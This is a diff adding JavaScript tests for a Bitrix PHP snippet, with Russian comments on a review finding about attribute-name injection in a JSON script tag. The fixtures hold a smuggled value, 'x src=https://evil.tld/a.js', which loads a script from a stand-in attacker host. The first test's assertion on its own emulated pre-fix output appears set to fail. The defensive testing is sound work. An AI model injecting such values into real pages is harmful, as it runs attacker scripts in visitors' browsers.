@@ -163,6 +163,50 @@ describe('bitrix/snippets/json-data.php — JSON-данные для JS (T11.1 S
   });
 });
 
+describe('ревью T11.1 (high): json-data.php — имя данных в позиции ИМЕНИ атрибута', () => {
+  // htmlspecialchars — экранировщик ЗНАЧЕНИЙ атрибутов: пробел и '=' он не
+  // трогает. $name же попадает в позицию ИМЕНИ атрибута без кавычек
+  // (json-data.php: '<script type="application/json" ' . $attr . …), поэтому
+  // враждебное имя 'x src=https://evil.tld/a.js' собирает
+  // <script type="application/json" data-ui-x src=https://evil.tld/a.js-data>:
+  // HTML-токенизатор режет по пробелу — второй атрибут src= тянет внешний
+  // скрипт, который загрузится и исполнится (inline-тело при наличии src
+  // игнорируется). Фикс — ВАЛИДАЦИЯ имени гейтом /^[a-z][a-z0-9-]*$/i с
+  // подменой на 'invalid' (заодно закрывает $name='' → data-ui--data):
+  // для контекста имени атрибута экранирование не работает, работает гейт.
+
+  /** htmlspecialchars с ENT_QUOTES — как в сниппете (контекст ЗНАЧЕНИЯ). */
+  const escapeHtmlAttr = (value) =>
+    String(value)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#039;');
+
+  it('враждебное имя не порождает второго атрибута src= (воспроизводит замечание)', () => {
+    // Эмуляция сборки сниппетом ДО фикса: sprintf('data-ui-%s-data',
+    // htmlspecialchars($name)) — враждебное имя проходит насквозь.
+    const emitted =
+      '<script type="application/json" data-ui-' +
+      escapeHtmlAttr('x src=https://evil.tld/a.js') +
+      '-data>';
+    expect(emitted, 'второй атрибут src= не появился').not.toContain('src=');
+  });
+
+  it('пустое имя не собирает пустой data-ui--data', () => {
+    const emitted = '<script type="application/json" data-ui-' + escapeHtmlAttr('') + '-data>';
+    expect(emitted).not.toContain('data-ui--data');
+  });
+
+  it('сниппет валидирует имя гейтом /^[a-z][a-z0-9-]*$/i с подменой на invalid (маркер фикса)', () => {
+    expect(jsonData).toMatch(
+      /preg_match\(\s*'\/\^\[a-z\]\[a-z0-9-\]\*\$\/i'\s*,\s*\(string\)\s*\$name/,
+    );
+    expect(jsonData).toContain("$name = 'invalid'");
+  });
+});
+
 describe('bitrix/first-connect-checklist.md — исполняемый чек-лист (Implementation requirements п.2)', () => {
   const items = checklist.match(/^- \[ \] \*\*\d+\. /gm) ?? [];
 
